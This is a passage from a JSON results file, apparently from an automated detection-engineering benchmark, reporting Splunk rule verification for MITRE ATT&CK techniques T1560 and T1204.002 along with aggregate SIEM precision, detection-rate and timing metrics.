      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "56b4837f-6432-4ff6-8c96-a8502649a298",
      "ttp_id": "T1560",
      "detected": true,
      "events_found": 2,
      "query_time_ms": 427.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "2153e479-42fa-4089-bea4-76430769843d",
      "ttp_id": "T1204.002",
      "detected": true,
      "events_found": 110,
      "query_time_ms": 1606.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    }
  ],
  "siem_metrics": {
    "true_positives": 15,
    "false_positives": 0,
    "false_negatives": 2,
    "precision": 1.0,
    "detection_rate": 0.8823529411764706,
    "f1_score": 0.9375
  },
  "iterations": 1,
  "final_score": 0.8294117647058823,
  "final_report": {
    "total_ttps": 29,
    "optimized_ttps": 17,
    "generated_rules": 17,
    "generated_attacks": 101,
    "timestamp": "2025-12-28T21:15:33.915993"
  },
  "timestamp": "2025-12-28T21:15:33.923918",
  "benchmark_metrics": {
    "duration_s": 1507.525000333786,
    "quality_score": 0.7270437779072025
  }
}